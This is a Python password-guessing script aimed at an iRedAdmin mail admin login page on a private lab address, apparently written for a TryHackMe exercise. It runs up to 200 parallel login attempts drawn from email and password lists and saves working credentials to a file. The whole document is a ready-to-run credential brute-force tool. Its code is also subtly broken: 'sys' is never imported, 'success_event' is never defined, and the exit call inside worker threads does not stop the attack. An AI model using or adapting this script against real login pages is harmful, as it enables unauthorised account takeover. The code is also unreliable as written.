import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

# Suppress SSL warnings for internal lab IPs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration ---
TARGET_URL = "https://10.10.155.5/iredadmin/login"
EMAIL_FILE = "emails.txt"
PASS_FILE = "common-passwords"
THREADS = 200  # Adjust based on how the box handles load

# Custom headers from your request capture
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://10.10.155.5",
    "Referer": "https://10.10.155.5/iredadmin/login"
}

def attempt_login(email, password):
    data = {
        "username": email,
        "password": password,
        "form_login": "Login",
        "lang": "en_US"
    }
    
    try:
        # verify=False because THM boxes usually have self-signed certs
        # allow_redirects=False allows us to catch the 303 status immediately
        response = requests.post(
            TARGET_URL, 
            data=data, 
            headers=HEADERS, 
            verify=False, 
            allow_redirects=False,
            timeout=5
        )
        
        location = response.headers.get("Location", "")
        
        # Check if the redirect contains the invalid credential flag
        if "INVALID_CREDENTIALS" in location:
            print(f"[-] FAILED: {email} : {password}")
        elif response.status_code == 303:
            # If it's a 303 but doesn't say INVALID_CREDENTIALS, it's likely a hit
            print(f"\n[!] SUCCESS: {email} : {password}\n")
            # You could write this to a file here for safekeeping
            with open("found.txt", "a") as f:
                f.write(f"{email}:{password}\n")
            sys.exit()
        else:
            print(f"[?] Unexpected Status {response.status_code} for {email}")
            
    except Exception as e:
        print(f"[!] Error testing {email}: {e}")

def main():
    try:
        with open(EMAIL_FILE, "r") as e_file:
            emails = [line.strip() for line in e_file if line.strip()]
        with open(PASS_FILE, "r") as p_file:
            passwords = [line.strip() for line in p_file if line.strip()]
    except FileNotFoundError as e:
        print(f"Error: {e}")
        return

    print(f"[*] Loaded {len(emails)} emails and {len(passwords)} passwords.")
    print(f"[*] Starting attack on {TARGET_URL}...")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for email in emails:
            for password in passwords:
                executor.submit(attempt_login, email, password)
    
    if success_event.is_set():
        print("Success detected. Exiting.")
        sys.exit()

if __name__ == "__main__":
    main()
